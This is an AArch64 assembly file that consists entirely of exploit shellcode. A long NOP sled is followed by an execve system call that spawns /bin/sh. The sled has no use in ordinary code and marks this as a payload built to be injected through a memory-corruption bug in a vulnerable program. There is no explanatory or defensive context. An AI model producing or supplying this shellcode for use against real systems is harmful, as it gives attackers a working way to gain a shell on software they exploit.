.global _start

.section .text
_start:
    // NOP sled
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop

    // execve("/bin/sh", NULL, NULL)
    adr x0, bin_sh
    mov x1, xzr
    mov x2, xzr
    mov x8, 0xdd
    svc 0

bin_sh: .asciz "/bin/sh"
